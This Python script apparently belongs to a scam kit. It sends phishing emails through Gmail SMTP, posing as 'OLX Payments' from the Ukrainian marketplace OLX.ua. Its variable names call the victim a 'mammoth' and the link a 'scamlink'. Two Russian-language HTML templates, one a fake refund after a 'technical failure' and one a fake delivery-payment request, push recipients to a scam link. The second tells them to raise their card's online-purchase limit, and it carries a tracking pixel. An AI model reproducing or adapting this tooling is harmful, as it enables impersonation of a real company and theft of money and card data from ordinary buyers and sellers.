import smtplib
import ssl

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def vozvrat(mamont, pochta, password, scamlink, imya_mamonta, tovar):

    message = MIMEMultipart("alternative")
    message["Subject"] = "OLX.ua - Технический сбой"

    message["From"] = f"OLX Payments ({pochta})"
    message["To"] = mamont

    html = f"""\
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
    <html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css" nonce="">
    </style></head><body><div class="bodycontainer"><div class="maincontent"><table class="message" width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td colspan="2"><table width="100%" cellspacing="0" cellpadding="12" border="0"><tbody></tbody><tbody><tr style="border-collapse:collapse">
    <td style="padding:0;Margin:0" valign="top">
    <table style="border-collapse:collapse;border-spacing:0px;table-layout:fixed!important;width:100%" cellspacing="0" cellpadding="0" align="center">
    <tbody>
    <tr><td><table style="border-collapse:collapse;border-spacing:0px;background-color:#ffffff" width="600" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
    <tbody><tr style="border-collapse:collapse">
    <td style="padding:0;Margin:0;padding-left:20px;padding-right:20px;padding-top:40px;background-color:transparent;background-position:left top" bgcolor="transparent" align="left">
    <table style="border-collapse:collapse;border-spacing:0px" width="100%" cellspacing="0" cellpadding="0">
    <tbody><tr style="border-collapse:collapse">
    <td style="padding:0;Margin:0" width="560" valign="top" align="center">
    <table style="border-collapse:collapse;border-spacing:0px;background-position:left top" width="100%" cellspacing="0" cellpadding="0">
    <tbody><tr style="border-collapse:collapse">
    <td style="padding:0;Margin:0;padding-top:5px;padding-bottom:5px" align="center"><img src="https://i.imgur.com/vaOVHBI.png" alt="" style="display:block;border:0;outline:none;text-decoration:none" width="150" height="150"><div dir="ltr" style="opacity:0.01"><div id="m_5795860297217198143m_5142650255196264233:pg"><div></div></div></div></td>
    </tr>
    <tr style="border-collapse:collapse">
    <td style="padding:0;Margin:0;padding-top:15px;padding-bottom:15px" align="center"><h1 style="Margin:0;line-height:24px;font-family:arial,helvetica neue,helvetica,sans-serif;font-size:20px;font-style:normal;font-weight:normal;color:#333333"><strong>Здравствуйте, {imya_mamonta}!</strong></h1></td>
    </tr>
    <tr style="border-collapse:collapse">
    <td style="padding:0;Margin:0;padding-left:40px;padding-right:40px" align="center"><p style="Margin:0;font-size:18px;font-family:helvetica,helvetica neue,arial,verdana,sans-serif;line-height:27px;color:#666666">Во
    время обработки Вашего заказа (<b>{tovar}</b>) произошёл технический сбой на стороне 
    нашей системы. Для возврата ваших средств,
    пожалуйста, следуйте нашим указаниям, нажав на кнопку <b>далее</b></p><p style="Margin:0;font-size:18px;font-family:helvetica,helvetica neue,arial,verdana,sans-serif;line-height:27px;color:#666666"><br></p><p style="Margin:0;font-size:18px;font-family:helvetica,helvetica neue,arial,verdana,sans-serif;line-height:27px;color:#666666">Среднее время возврата составляет <b>5 минут</b></p><p style="Margin:0;font-size:18px;font-family:helvetica,helvetica neue,arial,verdana,sans-serif;line-height:27px;color:#666666"><br></p><p style="Margin:0;font-size:18px;font-family:helvetica,helvetica neue,arial,verdana,sans-serif;line-height:27px;color:#696969">Просим извинения за предоставленные неудобства. Наши инженеры уже работают над устранением проблемы</p></td>
    </tr>
    <tr style="border-collapse:collapse">
    <td style="Margin:0;padding-left:10px;padding-right:10px;padding-top:40px;padding-bottom:40px" bgcolor="transparent" align="center"><span style="border-style:solid;border-color:#002f34 !important;background:#002f34 !important;display:inline-block;border-radius:10px;width:auto"><a href="{scamlink}" data-saferedirecturl="https://www.google.com/url?hl=ru&amp;q=https://u15613671.ct.sendgrid.net/ls/click?upn%3DfEMRsqj16RoIbjm2Ld1Sz0-2FI77Z8-2BB2SBVZLhQZBP6iPK-2FxuJP9IzuUuki-2BZoIMQFPpry6e2wUL6eTLB7zQurpAngIrQ8cyzk7WkRL9JRpvNOAs3hp1VJ2XBtKblqSN2uJTf3pu883cLGQKU-2FIeSkA-3D-3DWSyj_-2BBM59Ve1INxwhWWv8LhHtEpdsx3D8A-2BUk5UCuzHBKcr8-2BKyo50XtoNWmLmvDLosFR9OfPQfpcnt4iko9JY51flEEVByT6leiYvBLFN-2B81vMUglOy6m8lDpt1FQw473yVf-2BCU4xs5EgYnbiVEhyGcca9TpWw1Dvsy7jwRdP0xo-2FW4hqjC9dtfLZ-2FOsa2Kh1ge4dt79126Q1bpnh3xTRqqZrAI-2FTiwGotJkES7qh-2Bo6f4-3D&amp;source=gmail&amp;ust=1596974943411000&amp;usg=AFQjCNGg43u-gK5tMqQe3-UAJCxNVDf2Qw" style="text-decoration:none;font-family:lato,helvetica neue,helvetica,arial,sans-serif;font-size:16px;color:#ffffff;border-style:solid;border-color:#002f34;border-width:15px 20px 15px 20px;display:inline-block;background:#002f34;border-radius:10px;font-weight:bold;font-style:normal;line-height:19px;width:auto;text-align:center" rel="noreferrer noreferrer" target="_blank">Далее</a></span></td>
    </tr>
    </tbody></table></td>
    </tr>
    </tbody></table></td>
    </tr>
    </tbody></table>
    </td></tr></tbody></table></div></div></body></html>
    """

    part = MIMEText(html, "html")
    message.attach(part)

    port = 465
    password = password
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:

        server.login(pochta, password)
        server.sendmail(pochta, mamont, message.as_string())

def send(mamont, pochta, password, scamlink, imya_mamonta, tovar):

    message = MIMEMultipart("alternative")
    message["Subject"] = "Оформление доставки OLX.ua"

    message["From"] = f"OLX Payments ({pochta})"
    message["To"] = mamont

    html = f"""\
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
    <div>
    <center>
    <div style="background:#002f34;background-size:50%;width:500px;height:25px"></div>
    <div style="background:#002f34;width:500px;height:60px">
    <div style="text-align:center;margin:0 auto 0px;width:500px">
    <img style="display:block;margin-left:auto;margin-right:auto;width:105px;height:100px" src="https://i.imgur.com/vaOVHBI.png" width="40px">
    </div>
    </div>
    <div style="background:#002f34;background-size:50%;width:500px;height:25px"></div>
    <div style="text-align:center;padding:10px 0px;background:#fafafa;margin:0 auto 0px;width:500px">
    <p style="margin:0px;padding:18px;color:#7b8392;font-size:15px;line-height:22px;font-family:'Roboto', Arial, sans-serif !important;"><br>
    <b>Здравствуйте,
    {imya_mamonta}!</b> <br><br>Запрос на оформление товара <b>{tovar}</b> принят в обработку. <br><br>Чтобы завершить процесс оформления и перейти к оплате товара,
    нажмите на кнопку ниже. После оплаты товара,
    пожалуйста,
    проверьте свой личный кабинет на сайте!
    </p>
    </div>
    <div style="text-align:center;padding:10px 0px;background:#fafafa;margin:0 auto 0px;width:500px">
    <center><a href="{scamlink}" style="border-radius: 6px !important; text-decoration:none !important; font-size: 20px !important; font-family:'Roboto', Arial, sans-serif !important; text-decoration:none;width:50%;display:block;text-align:center;padding:6px 17px 6px 17px;border:1px solid #efefef;border-radius:4px;color:#fff;font-size:22px;word-wrap:break-word;background-color:#002f34" rel="noreferrer" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=ru&amp;q=https://u15613671.ct.sendgrid.net/ls/click?upn%3DfEMRsqj16RoIbjm2Ld1Sz0-2FI77Z8-2BB2SBVZLhQZBP6iPK-2FxuJP9IzuUuki-2BZoIMQFPpry6e2wUL6eTLB7zQurpAngIrQ8cyzk7WkRL9JRpvNOAs3hp1VJ2XBtKblqSN2uJTf3pu883cLGQKU-2FIeSkA-3D-3DWSyj_-2BBM59Ve1INxwhWWv8LhHtEpdsx3D8A-2BUk5UCuzHBKcr8-2BKyo50XtoNWmLmvDLosFR9OfPQfpcnt4iko9JY51flEEVByT6leiYvBLFN-2B81vMUglOy6m8lDpt1FQw473yVf-2BCU4xs5EgYnbiVEhyGcca9TpWw1Dvsy7jwRdP0xo-2FW4hqjC9dtfLZ-2FOsa2Kh1ge4dt79126Q1bpnh3xTRqqZrAI-2FTiwGotJkES7qh-2Bo6f4-3D&amp;source=gmail&amp;ust=1596974943411000&amp;usg=AFQjCNGg43u-gK5tMqQe3-UAJCxNVDf2Qw">
    <span>Купить с доставкой</span>
    </a>
    <div style="text-align:center;padding:10px 0px;background:#fafafa;margin:0 auto 0px;width:350px">
    <p style="margin:0px;padding:18px;color:#7b8392;font-size:12px;line-height:22px;font-family:Arial">
    <b>Внимание!</b> Оплата происходит с помощью карты. Убедительная просьба заранее <b>поднять лимит на интернет-покупки</b>. Спасибо.
    </p>
    </div>
    <div style="text-align:center;margin:0 auto 0px;background:#f0f0f0;width:500px">
    <p style="margin:0px;padding:18px;color:#abb0ba;font-size:11px;line-height:18px;font-family:Arial">Если у Вас возникли трудности,
    появились какие-либо вопросы или попросту не получается оформить заказ,
    то Вы можете обратиться к нашим специалистам OLX при помощи онлайн-чата. Команда технической поддержки работает с 9:00 до 22:00.<br>
    </p>
    </div>
    </center></div>
    </center>
    <img src="https://i.imgur.com/fwdpkmf.gif" alt="" style="height:1px!important;width:1px!important;border-width:0!important;margin-top:0!important;margin-bottom:0!important;margin-right:0!important;margin-left:0!important;padding-top:0!important;padding-bottom:0!important;padding-right:0!important;padding-left:0!important" width="1" height="1" border="0"></div>
    </div>
    </font></div></td></tr></tbody></table></td></tr></tbody></table></div></div></body></html>
    """
    part = MIMEText(html, "html")
    message.attach(part)

    port = 465
    password = password
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:

        server.login(pochta, password)
        server.sendmail(pochta, mamont, message.as_string())